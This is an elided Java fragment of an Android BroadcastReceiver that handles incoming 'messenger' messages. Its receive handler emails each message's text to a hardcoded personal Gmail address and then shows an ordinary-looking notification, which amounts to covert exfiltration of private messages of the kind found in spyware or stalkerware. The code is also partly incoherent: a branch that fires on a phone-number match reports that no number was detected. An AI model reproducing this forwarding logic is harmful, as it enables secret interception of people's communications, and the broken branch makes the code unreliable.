...
public class MessengerReceiver extends BroadcastReceiver {
    ...
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("com.messenger.NEW_MESSAGE")) {
            // Handle messenger message received
            Log.d(TAG, "Messenger message received");
            System. out. println("MessengerReceiver 40 onReceive ");

            // Extract message data from intent
            String message = intent.getStringExtra("message");

            // Forward messenger message via email
            try {
                JavaMailAPI.sendMail("babulahmed000015@gmail.com", "Messenger Message Forwarded", message);
                Log.d(TAG, "Messenger message forwarded successfully via email");
                System. out. println("MessengerReceiver 43 Messenger message forwarded successfully  ");
            } catch (MessagingException e) {
                Log.e(TAG, "Failed to forward messenger message: " + e.getMessage());
                e.printStackTrace();
            }

            // Add your messenger message handling logic here
            handleMessengerMessage(context, message);
        }
    }

    private void handleMessengerMessage(Context context, String message) {
        // Implement your logic to handle messenger messages here
        Log.d(TAG, "Handling messenger message: " + message);
        System. out. println("MessengerReceiver 42 Handling messenger message ");
        ...
        if (message.matches("\\d{3}[-\\.\\s]\\d{3}[-\\.\\s]\\d{4}")) {
            ...
            displayNotification(context, "New Messenger Message\nMessage: " + message + "\n(No phone number detected)");
        }
    }
    ...
    private void displayNotification(Context context, String message) {
        ...
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "channel_id")
                ...
                .setContentTitle("New Messenger Message")
